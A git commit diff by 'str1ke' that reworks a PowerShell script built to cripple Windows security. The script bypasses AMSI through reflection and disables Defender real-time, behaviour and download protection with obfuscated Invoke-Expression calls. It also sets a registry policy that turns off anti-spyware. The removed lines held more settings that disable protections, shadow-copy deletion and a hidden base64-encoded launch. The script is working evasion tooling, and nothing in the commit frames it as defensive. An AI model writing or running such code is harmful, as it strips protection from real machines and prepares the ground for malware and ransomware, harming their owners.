75f2f785b6978c81e82eb5f8fc4409af982bb698
str1ke <strikeoneseventhree@proton.me>
2026-02-07 16:37:14 +0200

    Update powershell.ps1

--- powershell.ps1
+++ powershell.ps1
@@ -1,9 +1,13 @@
-$c = @"
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdate $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true;
+$s = [Type];
+$g = $s::GetType("System.Management.Automation.AmsiUtils");
+$f = $g.GetField('amsiInitFailed', 'NonPublic,Static');
+$f.SetValue($null, $true);
+
+# Kill Defender Services & Preferences
+$p = "Set-MpPreference";
+Invoke-Expression "$p -DisableRealtimeMonitoring `$true";
+Invoke-Expression "$p -DisableBehaviorMonitoring `$true";
+Invoke-Expression "$p -DisableIOAVProtection `$true";
+
+# Registry Nuke
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f;
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f;
-vssadmin delete shadows /all /quiet;
-"@
-$b = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))
-powershell -NoP -NonI -W Hidden -Enc $b
